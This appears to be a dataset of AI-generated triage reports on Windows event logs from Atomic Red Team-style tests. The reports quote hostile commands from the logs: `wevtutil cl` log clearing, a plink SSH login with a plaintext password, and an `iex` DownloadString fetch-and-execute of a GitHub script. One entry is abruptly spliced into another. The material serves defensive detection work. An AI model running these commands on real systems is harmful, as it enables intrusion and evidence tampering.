The combination of clearing logs, suspicious PowerShell commands aimed at downloading and potentially executing external scripts, and evidence of elevated privileges strongly indicates malicious activity. The execution of scripts from an external, potentially malicious source further corroborates that malicious activities have likely taken place on the system.

### **Recommended Actions:**
1. **Immediate Containment**: 
   - Isolate the affected system (Server002) from the network to prevent potential lateral movements and further exfiltration or compromise.

2. **Forensic Analysis**:
   - Perform a deeper forensic analysis on the affected host to recover cleared logs, reconstruct activities, and understand the full scope of the breach.
   - Analyze network logs to trace if external communications have been established with potential C2 servers.

3. **Remediation**:
   - Clean and restore the system from known good backups prior to the identified malicious activity.
   - Consider reimaging the machine if necessary.

   - Enhance security monitoring and alerting for critical system processes, especially for high-integrity operations.

### **Resolution**: MALICIOUS

The logs contain clear indicators of compromise and malicious activities, necessitating immediate response and containment actions."
Enumerate logged on users via CMD (Domain),"In analyzing the provided Windows event logs, I have identified several activities that indicate suspicious behavior. Here's a breakdown of the logs:

1. **Log Clearing Activity:**
   - The `admin_test` user is associated with multiple log entries where the `wevtutil` command-line utility was used to clear logs across different channels. The use of `wevtutil` to clear logs (Event IDs 104 and 1102 in the System, Security, and Application logs) suggests an intentional effort to erase evidence of prior events, which is generally considered suspicious.

2. **Use of `wevtutil` Utility:**
   - The `wevtutil` tool is used for clearing event logs. Its usage by the `admin_test` user in conjunction with log clearing entries corroborates potential malicious behavior or an attempt to cover tracks.

3. **Process Execution:**
   - The logs show typical process execution related to log maintenance tasks which are usually not performed regularly and especially not all at once.
   - Regular process executions such as those related to `MicrosoftEdgeUpdate.exe` and associated helper processes seem to be typical background updating tasks. However, amidst the log clearing events, their presence does not directly link to the suspicious activity but fills out the timeline.

4. **Suspicious System Activity:**
   - The rapid succession of events and clearing actions could indicate an attempt to perform actions surreptitiously and erase traces swiftly.

**Assessment:**
- The logs reveal highly suspicious behavior, particularly with the usage of `wevtutil` to clear logs within a short time frame. Such actions are often associated with malicious activity intended to obfuscate or hide unauthorized or unsanctioned actions on the system.

**Resolution: SUSPICIOUS**

**Guidance:**
- **Immediate Steps:** Initiate a detailed investigation on the `admin_test` account's activities to discern whether the actions were sanctioned or if the account has been compromised.
- **Review Account:** Conduct a thorough review of user privileges and recent activity associated with `admin_test` to identify anomalies or unauthorized access.
- **Increase Monitoring:** Implement increased monitoring of account activities and changes to detect any further suspicious actions.
- **Audit Logs Regularly:** Ensure systematic audit and backup of log files to prevent unilateral clearance without oversight.
- **Check for Other Indicators:** Scan the system for additional indicators of compromise such as unauthorized software installations or changes to security settings.

Further investigation is warranted to determine the intent and whether these actions were part of broader unauthorized activities."
WMIObject Group Discovery,"Upon analyzing the provided logs from the CEO's machine, several key points of interest suggest potentially malicious activity:

### Analysis:

1. **Event Log Clearing:**
   - **System Log** (EventID 104): The log indicates that the logs for the System and Windows PowerShell channels were cleared by the user `admin_test` on `Server002`. Clearing logs is a common tactic used by attackers to cover their tracks.

2. **Suspicious Use of `wevtutil.exe`:**
   - **Sysmon Log** (EventID 1): Repeated executions of `wevtutil.exe` with the command line `cl` (clear log) were observed for multiple channels, including the 'Sysmon', 'Application', 'System', and 'Windows PowerShell'. This is suspicious and aligns with efforts to clear evidence of activity.

3. **Privilege Escalation and User Privileges:**
   - **Security Log** (EventID 4672): The user `admin_test` was granted a suite of high-level privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, and `SeBackupPrivilege`. The granting of these privileges can be indicative of a possible privilege escalation attack.

4. **Use of PowerShell Without Specific Commands:**
   - **PowerShell Log**: The PowerShell execution involving `Get-WMIObject Win32_Group` seems legitimate but could be used in a script or part of a larger attack chain aimed at enumerating group memberships.

5. **Execution of `whoami.exe` and `hostname.exe`:**
   - **Sysmon Log**: Execution of `whoami.exe` and `hostname.exe` by `admin_test`. These utility commands by themselves are not malicious but can be used by an attacker to gather system information.

6. **Multiple Clarification Logs:**
   - Using `wevtutil.exe` to clear various Event Viewer logs (Security, System, Application, etc.) suggests an attempt to obfuscate activity on the system.

### Assessment:

The activities observed in these logs, particularly the clearing of logs (`wevtutil cl`) and the granting of high-level privileges, are indicators of potential malicious behavior. These actions could signify that an attacker with administrative access attempted to cover their activities and gather information about the system.

### Resolution:

**MALICIOUS** - The presented logs contain clear indicators of malicious activity. The log clearing operations, privilege elevations, and use of PowerShell indicate potential unauthorized and nefarious activity.

### Guidance:

1. **Immediate Response:**
   - Isolate the machine to prevent further access or data exfiltration.
   - Perform a full forensic analysis to determine the level of compromise and identify any additional accessed or affected systems.

2. **Log and Audit Review:**
   - Review additional logs from surrounding times, including network traffic logs, to trace the source of access.

3. **Security Enhancements:**
   - Implement stricter monitoring and alerts for log clearing and privilege escalation.
   - Enforce the principle of least privilege to ensure administrative rights are tightly controlled.

4. **User and Access Review:**

   - These commands are typically used to gather security status and threat information, which could be part of regular system health checks.
   
2. **System Log Events**:
   - Log file cleared events for the System and Windows PowerShell channels suggest potential tampering or log-cleaning activities.
   - This action was performed by a user `admin_test`, which might indicate inappropriate credential use for system-level log clearing. 

3. **Security Log Events**:
   - Security logs were cleared by `admin_test` which is also suspicious, indicating possible attempts to hide malicious actions.

4. **Time Manipulation**:
   - Security logs show system time adjustments which may be used to confuse logs and conceal changes or actions performed during the altered time period.

5. **Sysmon Log Events**:
   - Frequent usage of `wevtutil.exe` to clear logs hints at attempts to cover tracks.
   - Execution of several utility programs (`whoami.exe`, `hostname.exe`) and system processes (`conhost.exe` and `wevtutil.exe`) under `admin_test` with High integrity level.
   - `MicrosoftEdgeUpdate.exe` and related processes show a series of updates being executed, which is routine but coupled with the above suspicious activities might indicate misuse.

6. **Application Log**:
   - Normal logging related to software protections and Edge updates; however, coupled with suspicious activities from other logs, the application logs are sparse.

#### Assessment:

There are multiple activities that are considered suspicious:
- The clearing of logs across multiple channels could indicate malicious intent to hide activities.
- Time manipulation efforts recorded in security logs are also a red flag.
- High integrity level executions by `admin_test` include processes typically associated with system interrogation or monitoring, which could be indicative of reconnaissance activities by a malicious actor using elevated privileges.

The nature and combination of these activities strongly hint towards an attempt at covering tracks, possibly by someone with insider access or compromised credentials.

#### Conclusion:

**Resolution**: **SUSPICIOUS** 

Given the severity and combination of the listed activities, while there is no direct evidence of breach or exfiltration, the log manipulations, and credential usage indicate behavior deviating from normal operations. Further investigation is required to confirm whether these actions are benign administrative tasks or if they are indeed masking malicious activities.

#### Recommendation:

- Immediately review user `admin_test`'s activity history and credentials for potential compromise.
- Conduct a comprehensive audit of security policies and access logs.
- Increase monitoring on involved processes, especially log-clearing tools and time manipulation processes.

Basic Permission Groups Discovery Windows (Domain),"After reviewing the provided Windows event logs, here is a detailed analysis focusing on suspicious or anomalous activities:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearing**:
    - Events in both the Security and System channels (Event IDs 104 and 1102 for cleared logs) indicate that logs were cleared by the user `admin_test`. This is often a sign of malicious activity aimed at covering tracks. The specific use of `wevtutil.exe` for clearing logs (as seen in the Sysmon logs) strengthens this suspicion.

2. **Excessive Use of `wevtutil.exe`**:
    - The process `wevtutil.exe` is repeatedly invoked to clear logs from various channels (Sysmon/Operational, Security, Application, System, Windows PowerShell). This repetitive clearing across multiple log channels further suggests an attempt to erase evidence of other activities.

3. **Command Execution and Information Gathering**:
    - There are commands run that gather sensitive information from the system, such as `cmd.exe` executing net group commands to enumerate domain groups, including ""enterprise admins"" and ""domain admins"". This indicates privilege reconnaissance potentially by an unauthorized actor.

### Malicious Activity Indicators:

- **Log Clearing in Security-Related Context**: Both `wevtutil.exe` clearing and `wevtutil.exe` usage to manage logs are directly related to potential obfuscation techniques used by attackers to cover their tracks after penetrating a system.
- **Admin-Level Commands**: Executing high-level network administrative commands (`net localgroup`, `net group /domain`) is characteristic of activities carried out by attackers to understand and exploit network permissions.

### Assessment:
Considering the cumulative suspicious findings, such as the clearing of event logs and unauthorized privilege reconnaissance, it is highly likely that these activities are malicious.

### Resolution:
**MALICIOUS** - The logs contain activities (log clearing via `wevtutil` and network admin command execution) that strongly indicate an attempt to cover tracks and explore system permissions, signifying a breach or attempted compromise.

### Guidance:
1. **Immediate Containment**: Isolate the affected host to prevent further potential spread or data exfiltration.
2. **Forensic Analysis**: Conduct a detailed forensic investigation to understand the scope of the breach, the techniques used, and identify any other compromised systems.
3. **Review Access Logs**: Check for any unusual logins, especially around the time of the log clearance.
4. **Increase Monitoring**: Enhance logging and alerting, especially for critical systems and elevated commands.
5. **Incident Response Plan**: Engage security incident response procedures involving all relevant teams to address any security gaps that allowed this activity.

Taking these steps will help in mitigating any continued risks and preventing future incidents."
ESXi - Enumerate VMDKs available on an ESXi Host,"After a thorough analysis of the provided logs, there are several key observations that indicate suspicious and potentially malicious activities:

1. **Usage of wevtutil.exe**:
   - The logs indicate the use of `wevtutil.exe` to clear logs for multiple channels, including ""System,"" ""Windows PowerShell,"" and ""Security."" 
   - The command-line arguments for `wevtutil.exe` such as `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl Security`, and `cl ""Windows PowerShell""` suggest log clearing operations, which is a common tactic to cover tracks and is highly indicative of malicious activity.

2. **Suspicious Process Execution**:
   - The presence of `cmd.exe` executing a command with `plink.exe`, a command-line SSH tool, carrying out an external connection attempt (`plink.exe ""atomic.local"" -ssh  -l ""root"" -pw ""pass""`). This can point to establishing unauthorized remote access or lateral movement within the network.

3. **Indicators of Potential Malicious Activity**:
   - The AtomicRedTeam directory and payload references may indicate a penetration testing or adversary simulation exercise, but if this activity wasn't authorized or expected, it raises significant concerns.

4. **Event Log Clearing**:
   - The actions taken to clear the logs (`EventID 104` for various channels) using `admin_test` account underscore an attempt to erase traces of particular activities. The involvement of a high privilege account in this action is concerning and points towards a potential compromise or misuse of legitimate credentials.

5. **Use of SYSTEM Privileges**:
   - Several processes related to `Microsoft Edge Update` and other system services run under `NT AUTHORITY\SYSTEM`, highlighting legitimate software operations. However, the concern isn't the update processes but the context of their execution alongside malicious activities.

In summary, the combination of unauthorized and suspicious command-line executions, log clearing with `wevtutil.exe`, and use of a privileged account (`SERVER002\admin_test`) all point towards malicious activity. Given these activities are often used by attackers to obfuscate and maintain persistence within a system, this incident demands a high level of concern.

Examine domain password policy - Windows,"Upon reviewing the provided Windows event logs, the following indicators of potentially suspicious activity have been identified:

1. **Log Clearing Events**: Several logs indicate the clearing of event logs by the user `admin_test` on `SERVER002`. Specifically, event logs for the System, Security, and Windows PowerShell channels were cleared. This activity is logged under EventID 104 in the System log and EventID 1102 in the Security log. Clearing of logs is often associated with attempts to cover tracks by a malicious actor.

2. **Privilege Escalation and Sensitive Privileges**: The `admin_test` user, whose activities were logged, had elevated privileges including `SeDebugPrivilege` and others (as found in EventID 4672 in the Security log). Usage of these privileges can be indicative of malicious activity, particularly if they were not expected to be used in regular operations.

3. **Suspicious Process Executions**:
   - Multiple instances of processes related to `wevtutil.exe` (an event log utility) were executed (seen in Sysmon logs) with the command `wevtutil cl`, which is used to clear logs. The execution of this process is consistent with the clearing of event logs.
   - Several command-line tools such as `hostname.exe`, `whoami.exe`, and `cmd.exe` running queries like `net accounts /domain` are being executed. While these can be legitimate uses, in conjunction with log clearing, they might suggest reconnaissance activities.

4. **Time Manipulation**: Windows Kernel General Log entries show changes in system time (EventID 1 and 24), which may be an attempt to manipulate timestamps potentially to mislead log analysis. This is another common method used to cover tracks.

5. **Tool Execution**: The execution of `whoami.exe` and `hostname.exe` could be a normal operation, however, in context with other suspicious activities, it raises concern about potential reconnaissance or validation of user context by an intruder.

**Assessment**:

The combination of cleared event logs, processes with broad privileges being executed, potential reconnaissance commands, and time manipulation can strongly suggest malicious intent. The behavior aligns with an attacker attempting to gather information and cover their tracks.

**Recommendation**:

1. **Immediate Response**: Since we have evidence suggesting possible compromise, isolate the CEO's machine from the network immediately to prevent further potential malicious activity.

2. **Further Investigation**: Conduct a deep forensic investigation of the machine. Retrieve any additional logs, especially before the logs were cleared if backups are available. Analyze network traffic from the time frame for any suspicious connections or unusual data exfiltration.

3. **User Account Review**: Evaluate the `admin_test` account's creation and authentication activities across the network to determine if this account has been used illegitimately.

4. **Implement Monitoring**: Enhance monitoring on critical accounts and systems, ensuring that alerts are generated for anomalous activities, especially those involving elevated privileges or log clearing.

5. **Awareness and Training**: Provide training to users on suspicious activity recognition and report procedures. Reinforce policies related to the proper use of administrative privileges.

Use of SecEdit.exe to export the local security policy (including the password policy),"Upon analyzing the provided Windows event logs from the CEO's machine, the following observations and potential indicators of malicious activity are apparent:

1. **Process Execution:**
   - Repeated execution of `""MicrosoftEdgeUpdateComRegisterShell64.exe""` and `“MicrosoftEdgeUpdate.exe”`, which are legitimate processes related to Microsoft Edge updates, appear to be running multiple times utilizing `NT AUTHORITY\SYSTEM`. While legitimate under normal circumstances, it's crucial to confirm the frequency and timing of these executions as potential indicators of misuse or hijacking by a malicious entity.

2. **Account Activity:**
   - The user `SERVER002\admin_test` executed a series of commands (`whoami.exe`, `wevtutil.exe`, `cmd.exe`, `secedit.exe`) predominantly from high integrity levels, suggesting elevated privileges.
   - Multiple instances of `wevtutil.exe cl` command were used to clear event logs (`Microsoft-Windows-Sysmon/Operational`, `Application`, `Security`, `System`, and `Windows PowerShell`). This is a significant red flag as clearing logs is a typical behavior performed by attackers to hide their tracks.

3. **Command Line Usage:**
   - The execution of `cmd.exe` with `secedit.exe /export /areas SECURITYPOLICY` suggests potential attempts to export security policies. This may be indicative of reconnaissance or preparations to alter system configurations.

4. **Log Clearing:**
   - The System, Windows PowerShell, and Security logs were cleared by user `admin_test`. This is highly suspicious behavior, often associated with attempts to erase evidence of unauthorized or malicious activity on a host.

5. **No Direct EDR Indicators:**
   - The logs don't directly reflect known indicators of compromise from EDR alerts e.g., hash signatures related to known malware, but the actions observed (log cleaning, elevated privileges) strongly suggest an attempt to conceal activities possibly aligned with a security breach.

Based on the above analysis, the actions performed, especially the clearing of event logs and the execution of tools like `whoami` and `secedit`, indicate potential unauthorized activity with probable malicious intent. The behavior reflects common patterns in post-exploitation scenarios where attackers seek to maintain persistence and evade detection.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Investigation:**
   - Conduct a thorough investigation into the user account `admin_test` and verify if these actions were authorized. Investigate any discrepancies in account activity reporting or unusual working hours.
   
2. **Endpoint Isolation:**
   - Isolate the affected system from the network to prevent further suspicious activity and lateral movement potentially being conducted by the attacker.

3. **Forensic Analysis:**
   - Perform detailed forensic analysis on the system to identify potential backdoors, persistence mechanisms, or additional artifacts left by the attacker.

4. **Restore and Harden Logs:**
   - Restore cleared logs from backup if available to conduct a full audit trail. Implement enhanced logging mechanisms and restrictions to ensure critical logs are tamper-resistant moving forward.

5. **Security Awareness Training:**
   - Conduct organization-wide security awareness and training programs, focusing on recognizing and reporting suspicious activities.

In summary, due to the log clearance activity and the elevated privileges utilized, along with commands executed, this activity appears unauthorized and points toward malicious intent requiring immediate response and containment actions."
System Discovery using SharpView,"### Analysis & Findings

Upon reviewing the provided logs, several points of interest and concern emerge that need detailed examination:

1. **Clearing Event Logs:**
   - The logs indicate that Sysmon, System, Security, and Windows PowerShell event logs were cleared by the user `SERVER002\admin_test`. This is evident from multiple Sysmon EventID 1 logs (process launch) for `wevtutil.exe` with clear command lines (e.g., `wevtutil.exe cl Security`).
   - Log clearing is a very common tactic used by threat actors to hide their tracks, suggesting an attempt to cover up malicious activity.

2. **Wevtutil Usage:**
   - `wevtutil.exe` (Eventing Command Line Utility) is being executed with the command lines to clear different logs like Security, System, and Application. This action is generally suspicious unless explicitly documented as a maintenance task by systems administrators.

3. **PowerShell Script with Potential Malicious Intent:**
   - There is a PowerShell command execution captured involving `Invoke-ACLScanner`, `Invoke-Kerberoast`, and `Find-DomainShare`. These keywords are associated with reconnaissance and Active Directory enumeration activities often preceding more aggressive attacks like credential dumping or lateral movement.
   - The SharpView component mentioned is part of attacker toolkits used for domain-specific reconnaissance.

4. **Atomic Red Team Reference:**
   - The presence of `AtomicRedTeam` reference in the PowerShell command suggests potential simulation or red team activity. However, if this is not pre-authorized or part of regular security testing, it could indicate unauthorized activity.

5. **High Integrity Levels:**
   - The activities by `SERVER002\admin_test` were performed with high integrity level, indicating administrative privileges.
   
6. **Multiple Conhost.exe Instances:**
   - There are various instances of `conhost.exe` spawned as child processes to `wevtutil.exe` which may be normal for handling console inputs during execution but in conjunction with the suspicious activities it may reflect process spawning as part of the obfuscation of actions.

### Conclusion

Based on the above points, the activities captured in these logs, specifically the clearing of event logs, execution of potential reconnaissance scripts, and administrative privileges utilized, demonstrate clear indicators of malicious behavior.

Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,"After analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Key Observations:

1. **Event Logs Clearance:**
   - Multiple logs are showing that event logs have been cleared. Specifically, the `EventID 104` in the System log and `EventID 1102` in the Security log indicate that logs for various channels (""System"", ""Windows PowerShell"", ""Microsoft-Windows-Sysmon/Operational"", and ""Security"") have been cleared by the user `admin_test` on `SERVER002`. Clearing log files can be indicative of a cover-up attempt following unauthorized or malicious activity.

2. **Command Line Utility Usage:**
   - There are multiple Sysmon events where the `wevtutil.exe` command line utility was used by `user admin_test` to clear event logs. The command line utility `wevtutil.exe` was executed in `High Integrity` mode, which can indicate attempts to tamper with logs or other data related to event logging.

3. **Powershell Activity:**
   - Instances of PowerShell usage, notably using commands `Get-CimInstance` and `Get-WmiObject` to query antivirus status, have been executed. While querying antivirus status may be associated with legitimate administrative tasks, it could also be part of a reconnaissance phase by an attacker to determine security software status.

4. **Time Tampering:**
   - Security logs include `EventID 4616`, showing instances of system time changes on `SERVER002`, achieved via the process `svchost.exe`. Time manipulation can be used to confuse logs and timestamps to cover tracks.

5. **Edge Update Activity:**
   - There are numerous entries related to Microsoft Edge updates occurring in quick succession. This activity appears routine and system-initiated; however, it warrants a cross-verification to ensure integrity due to the preceding suspicious activities.

### Assessment:

The presence of log clearing activities, execution of `wevtutil.exe` to clear event logs, especially aligned with tampering of audit and system records, highly indicates potentially malicious intent. These actions are classic indicators of post-exploit cleanup processes where attackers attempt to hide their tracks. Additionally, PowerShell scripts querying security centers further hints at reconnaissance or malicious intent.

### Resolution:

- **Resolution: MALICIOUS**

### Recommendations:

1. **Immediate Containment:**
   - Isolate the affected host `SERVER002` from the network to prevent further unauthorized access or data exfiltration.

2. **Forensic Analysis:**
   - Conduct a thorough forensic investigation on `SERVER002` to determine the full scope and entry point of the intrusion.

3. **Review Security Policies:**
   - Review and enhance logging policies to ensure appropriate retention and detect attempts of log tampering or clearing.

4. **User Access Review:**
   - Scrutinize user permissions, especially `admin_test`, and monitor for any unauthorized elevating privileges.

5. **Patch Management:**
   - Validate that all systems are properly patched, especially considering the Microsoft Edge updates.

WinPwn - PowerSharpPack - Watson searching for missing windows patches,"Based on the analysis of the provided Windows event logs:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**: 
   - The logs indicate the execution of a PowerShell command with a `DownloadString` function that downloads a script from an external source (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1`). This action is executed using `iex (Invoke-Expression)`, which is a common method used by attackers to execute malicious scripts directly from memory.
   - The use of `iex` to execute scripts directly is highly suspicious as it is often used in fileless malware attacks or to evade detection tools that focus on file-based malware.

2. **Event Log Clearing**:
   - Sysmon and Security logs show the use of `wevtutil.exe` to clear event logs (`cl <log_name>` commands), which is typically done to cover tracks of malicious activities. The clearing of logs is an indicator of potentially malicious activity as attackers might clear logs to remove evidence of their presence or actions.

3. **Windows Security Log - Event ID 1102**:
   - This event indicates the security log has been cleared. This action is notable because clearing of security logs is a method to hide traces of unauthorized activities.

4. **Execution of System Utilities**:
   - The execution of system utilities like `whoami.exe`, `hostname.exe`, and others in quick succession can be indicative of reconnaissance efforts to gather system and network information.

5. **Time Change Events (Event ID 4616)**:
   - Multiple time changes within a short period can indicate attempts to tamper with system time, further obscuring evidence of malicious activity.

### Assessment:
- **Indicators of Compromise (IOCs)** were identified, including the use of external scripts executed via PowerShell and the utilization of wevtutil to clear event logs. These actions are consistent with malicious behavior typically seen in attacks aimed at data exfiltration or lateral movement within a network.

### Threats and Risks Identified:
- **Risk of Unauthorized Access**: The behavior observed suggests an attempt to execute unauthorized scripts and potentially gain elevated privileges or access sensitive information.
- **Data Exfiltration or Tampering**: With the logs being cleared, there's a risk that data might have been exfiltrated, or system integrity compromised without trace.
- **Persistence of Malicious Activity**: The evasion tactics observed indicate a potential for a persistent threat actor attempting to maintain access to the system.

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the machine (CEO's computer) to prevent any further potential data exfiltration or damage.
2. **Detailed Forensic Analysis**: Conduct a comprehensive forensic analysis on the system to uncover any other signs of compromise or potential backdoor installations.

Process Discovery - PC Hunter,"Based on the provided log entries, let's conduct a detailed analysis to identify suspicious or potentially malicious activities:

### Security Log Analysis:
1. **Event ID 1102**: Indicates that the security log was cleared by the account `admin_test`. Log clearing can be an indication of potential malicious activity as it is often done to erase evidence.
2. **Event ID 4672**: The `admin_test` account was assigned special privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`. These privileges can allow a user to perform sensitive operations on the system, including modifying system processes and files.
3. **Event ID 4624**: A logon session for `admin_test` with `LogonType 3` (network logon) was established from an external address, indicating possible remote access.
4. **Event ID 4634**: A logoff event for `admin_test`.

### Windows PowerShell Log Analysis:
1. PowerShell logs show the execution of `PCHunter64.exe`, which is a tool used for deep system inspection and can be leveraged for malicious purposes, especially if executed from a suspicious path like `C:\\Temp\\ExternalPayloads`.

### System Log Analysis:
1. **Event ID 104**: Logs for System and Windows PowerShell were cleared by `admin_test`, which further supports the possibility of covering tracks after executing potentially unauthorized or malicious actions.

### Sysmon Log Analysis:
1. The execution of `wevtutil.exe` to clear logs (for Security, System, and Windows PowerShell) by `admin_test`. The use of `wevtutil.exe` in this context is consistent with attempts to obfuscate actions.
2. Execution of `whoami.exe` and `hostname.exe` by `admin_test` could be attempts to gather information about the logged-on user and the machine as part of reconnaissance activities.
3. Execution of a potentially malicious file, `PCHunter64.exe`, from `PowerShell.exe` with administrative privileges, could be an indicator of malicious intent.

### Application Log Analysis:
1. Presence of certificate-related logs (Event ID 4097) does not inherently indicate malicious activity, but when combined with other factors, such as log clearing and privilege assignments, they may hint at potential compromise.

### Conclusion:
The provided logs display a clear pattern indicative of malicious activity. Specifically, the clearing of security, system, and PowerShell logs, along with the high privilege usage and execution of a suspicious executable (`PCHunter64.exe`) under administrative context, suggests an intentional effort to compromise the system.

### Resolution:
- **MALICIOUS**: The activities identified strongly indicate malicious behavior due to the combination of log clearing, high privilege actions, and execution of potentially malicious tools.

### Recommendations:
- Immediately isolate the machine (Server002) from the network to prevent further potential compromise.
- Conduct a thorough forensic investigation to determine the full scope and impact of the breach.
- Review `admin_test` account activities and consider it compromised; conduct a password reset and security review.
- Patch any identified vulnerabilities and consider increased monitoring on privileged accounts.
- Ensure that security audit policies are enforced and consider setting alerts for significant event IDs like log clearance (ID 1102)."
Discover System Language with chcp,"Upon reviewing the provided Windows event logs, I have identified several significant activities related to the use of the `wevtutil.exe` command and subsequent events across the System, Security, and Sysmon logs which indicate potential security concerns:

### Analysis:

1. **Use of `wevtutil.exe`:**
   - The logs show multiple instances of `wevtutil.exe` being executed with the command-line argument `cl` followed by various log names (e.g., `Application`, `System`, `Security`, `Windows PowerShell`). This specific command is typically used to clear event logs. Clearing logs in an unexpected manner could be indicative of an attempt to cover malicious activities, as it deletes traces of previous activities that may have been recorded in the logs.

2. **Clearing of Event Logs:**
   - The System and Security logs contain events indicating that the `System` and `Windows PowerShell` channels were cleared (Event ID 104 in the System log, Event ID 1102 in the Security log). The subject for these actions is `admin_test`, suggesting an administrative account was used for these operations. Clearing logs without a legitimate administrative reason is suspicious and often associated with malicious activity.

3. **Privilege Escalation:**
   - The Security log contains Event ID 4672, which indicates that privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others were assigned to `admin_test`. These privileges allow for significant access and are often targeted in privilege escalation attacks.

4. **Time Manipulation:**
   - There are indications of potential time manipulation in the logs. For instance, Security Event ID 4616 logs a time change by the `svchost.exe` process. While this can occur for valid reasons (e.g., time synchronization), in conjunction with other suspicious activities, it raises concerns as time changes can be used to confuse forensic analysis.

5. **Process Execution:**
   - A sequence of tools, such as `whoami.exe` and other Windows utilities, executed consecutively could indicate enumeration activities possibly by a script or manual investigation.

### Assessment:

Given the above findings, there are several key indicators typical of malicious behaviors, especially the clearing of logs using `wevtutil.exe` with a high-level integrity process and the evidence of privileges being granted and used to perform these actions. The activities on this host are highly suspicious due to the log clearing and use of administrative privileges in a potentially unauthorized manner.

### Resolution:

- **SUSPICIOUS:** The logs contain activities that strongly merit further investigation. There is potential evidence of an attempt to hide malicious actions by clearing logs. It is recommended to conduct a thorough investigation into the administrative account `admin_test` usage, verify legitimate reasons for the log-clearing activities, and review related access and commands executed around the same time. Consideration should be given to scanning the system for malware or unauthorized scripts and reviewing network activities associated with this host."
Process Discovery - wmic process,"After analyzing the provided logs from the Windows host, there are several indicators of suspicious activity that warrant further investigation:

1. **Log File Clearing Activity**: Events in the Security and System logs show that the `admin_test` user performed a log file clearing operation using `wevtutil.exe`. This is suspicious because clearing the event logs can be an attempt to cover tracks after suspicious activities.

   - **Security Log Cleared Event (EventID: 1102)**:
     - `SubjectUserName`: admin_test
     - `ClientProcessId`: 5348
   
   - **System Log Cleared Event (EventID: 104)**:
     - `SubjectUserName`: admin_test
     - Process linked to this was `wevtutil.exe`, indicating use of the command line to clear logs.

2. **Time Change Events**: The Security log shows Time Change events (EventID: 4616), where the system time appears to have been altered back and forth around the same timestamps. This can be a method used by attackers to manipulate logs and timestamps.

3. **Sequence of `wevtutil.exe` Usage**: Multiple instances of `wevtutil.exe` being executed to clear different event logs:
   
   - **Sysmon Log Events**:
     - Command executed: `""C:\Windows\system32\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - Similar commands were executed for Application and System logs.

4. **Usage of Command Line Utilities**: The `cmd.exe` and `wmic.exe` were executed with specific commands, which is generally used for administrative tasks but can also be indicative of reconnaissance or system information gathering:
   
   - **Command Executed**: `""cmd.exe"" /c wmic process get /format:list`

These activities combined suggest a systematic effort to manipulate system logs and possibly gather system information, indicative of an attempt to obfuscate unauthorized activities.

**Assessment**: Based on the analysis, the activities observed in the logs point towards potential malicious behavior given the attempted log clearing and time tampering activities. There is a high likelihood of a malicious actor being involved, attempting to erase logs and potentially prepare for other malicious activities or tamper with existing system configurations.

**Resolution**: MALICIOUS

**Guidance on How to Proceed**:
- Immediate containment of the host machine to prevent further potential harm.
- Conduct a deeper forensic investigation to identify any unauthorized access or data exfiltration that may have occurred.
- Review recent changes on the machine, monitor other systems for similar activities, and identify if this is part of a more extensive campaign.
- Revisit access security policies and ensure that unnecessary administrative rights are not given to regular users.
- Consider resetting the passwords for the `admin_test` account and any other accounts accessed from this machine.
